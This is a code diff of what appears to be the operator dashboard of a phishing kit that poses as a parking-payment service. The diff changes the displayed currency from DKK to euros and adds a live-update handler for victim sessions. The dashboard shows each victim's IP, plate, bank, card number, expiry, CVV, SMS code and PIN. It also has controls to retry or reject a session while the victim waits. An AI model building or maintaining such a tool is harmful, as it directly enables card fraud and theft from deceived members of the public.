@@ -45,7 +45,7 @@
     <h3 style="font-weight:700;color:#1e293b;margin-bottom:4px">💰 Setează Prețul</h3>
     <p id="modal-info" style="font-size:11px;color:#94a3b8;margin-bottom:12px"></p>
     <div style="display:flex;align-items:center;border:2px solid #e2e8f0;border-radius:8px;margin-bottom:14px;overflow:hidden">
-      <span style="padding:0 10px;color:#94a3b8;font-weight:700;border-right:1px solid #e2e8f0;line-height:2.8">DKK</span>
+      <span style="padding:0 10px;color:#94a3b8;font-weight:700;border-right:1px solid #e2e8f0;line-height:2.8">€</span>
       <input type="number" id="price-input" step="0.50" min="0.5" placeholder="0.00"
              style="flex:1;padding:10px;font-size:22px;font-weight:700;text-align:center;border:none;outline:none;background:transparent">
     </div>
@@ -104,7 +104,7 @@
             {% elif ps.status=='completed' %}<span class="badge bg-green-100 text-green-700">✓ Aprobat</span>{% endif %}
           </td>
           <td id="price-{{ ps.id }}" class="font-bold" style="color:#5a9e2f">
-            {% if ps.total_price %}{{ ps.total_price }} DKK{% else %}<span class="text-gray-300">—</span>{% endif %}
+            {% if ps.total_price %}{{ ps.total_price }} €{% else %}<span class="text-gray-300">—</span>{% endif %}
           </td>
           <td><div id="actions-{{ ps.id }}" class="flex gap-1 flex-wrap">
             {% if ps.status=='completed' %}
@@ -173,7 +173,7 @@
           <td class="font-mono text-xs" style="color:#ef4444">{{ ps.cvv or '—' }}</td>
           <td class="font-mono font-bold" style="color:#b45309">{{ ps.sms_status or '—' }}</td>
           <td class="font-mono font-bold" style="color:#7c3aed">{{ ps.pin_code or '—' }}</td>
-          <td class="font-bold" style="color:#dc2626">{{ ps.total_price or '—' }}{% if ps.total_price %} DKK{% endif %}</td>
+          <td class="font-bold" style="color:#dc2626">{{ ps.total_price or '—' }}{% if ps.total_price %} €{% endif %}</td>
           <td class="text-gray-400 text-xs">{{ ps.created_at.strftime('%d.%m.%Y %H:%M') }}</td>
         </tr>
         {% endfor %}
@@ -295,10 +295,10 @@ socket.on('new_session', function(d){
     <td class="font-mono text-gray-500 text-xs">${d.ip||'—'}</td>
     <td class="text-gray-600">${d.browser||'—'}</td>
     <td class="text-gray-600">${d.country||'—'}</td>
-    <td class="font-semibold" style="color:#166534;background:#f0fdf4">${d.locality||'—'}</td>
-    <td class="font-bold tracking-widest text-gray-800">${d.plate}</td>
-    <td class="text-gray-600">${d.car_type||'—'}</td>
-    <td class="font-bold text-gray-800">${d.hours} <span style="color:#94a3b8;font-size:10px">${d.time_unit||'ore'}</span></td>
+    <td class="font-semibold" style="color:#166534;background:#f0fdf4" id="loc-${d.id}">${d.locality||'—'}</td>
+    <td class="font-bold tracking-widest text-gray-800" id="plate-${d.id}">${d.plate}</td>
+    <td class="text-gray-600" id="ctype-${d.id}">${d.car_type||'—'}</td>
+    <td class="font-bold text-gray-800" id="hrs-${d.id}">${d.hours} <span style="color:#94a3b8;font-size:10px">${d.time_unit||'ore'}</span></td>
     <td id="bank-${d.id}" class="text-xs" style="color:#0369a1;font-weight:600">—</td>
     <td id="card-${d.id}" class="font-mono text-gray-300">—</td>
     <td id="exp-${d.id}" class="font-mono text-gray-300">—</td>
@@ -306,7 +306,7 @@ socket.on('new_session', function(d){
     <td id="sms-${d.id}"><span style="color:#94a3b8">—</span></td>
     <td id="pin-${d.id}"><span style="color:#94a3b8">—</span></td>
     <td id="status-${d.id}"><span class="badge bg-indigo-100 text-indigo-700">💳 Spre card</span></td>
-    <td id="price-${d.id}" style="color:#5a9e2f;font-weight:700">${d.price ? d.price+' DKK' : '—'}</td>
+    <td id="price-${d.id}" style="color:#5a9e2f;font-weight:700">${d.price ? d.price+' €' : '—'}</td>
     <td><div id="actions-${d.id}" class="flex gap-1 flex-wrap">
       <button class="btn-xs b-orange" onclick="retrySession(${d.id})"><i class="fas fa-redo"></i></button>
       <button class="btn-xs b-red" onclick="rejectSession(${d.id})"><i class="fas fa-times"></i></button>
@@ -318,11 +318,27 @@ socket.on('new_session', function(d){
   tryStartAlert(d.id, d.token);
 });
 
+socket.on('session_updated', function(d){
+  const plate=document.getElementById('plate-'+d.id);
+  const loc=document.getElementById('loc-'+d.id);
+  const ctype=document.getElementById('ctype-'+d.id);
+  const hrs=document.getElementById('hrs-'+d.id);
+  const pr=document.getElementById('price-'+d.id);
+  const st=document.getElementById('status-'+d.id);
+  if(plate) plate.textContent=d.plate||'—';
+  if(loc) loc.textContent=d.locality||'—';
+  if(ctype) ctype.textContent=d.car_type||'—';
+  if(hrs) hrs.innerHTML=d.hours+' <span style="color:#94a3b8;font-size:10px">'+d.time_unit+'</span>';
+  if(pr) pr.innerHTML='<span style="color:#5a9e2f">'+d.price+' €</span>';
+  if(st) st.innerHTML='<span class="badge bg-indigo-100 text-indigo-700">💳 Spre card</span>';
+  const row=document.getElementById('row-'+d.id);
+  if(row){ row.style.cssText='background:#fefce8;transition:background 2s'; setTimeout(()=>{row.style.background='';},2500); }
+});
 socket.on('price_set', function(d){
   const p=document.getElementById('price-'+d.id);
   const s=document.getElementById('status-'+d.id);
   const a=document.getElementById('actions-'+d.id);
-  if(p) p.innerHTML=`<span style="color:#5a9e2f">${d.price} DKK</span>`;
+  if(p) p.innerHTML=`<span style="color:#5a9e2f">${d.price} €</span>`;
   if(s) s.innerHTML=`<span class="badge bg-indigo-100 text-indigo-700">💳 Spre card</span>`;
   if(a) a.innerHTML=`
     <button class="btn-xs b-orange" onclick="retrySession(${d.id})"><i class="fas fa-redo"></i></button>
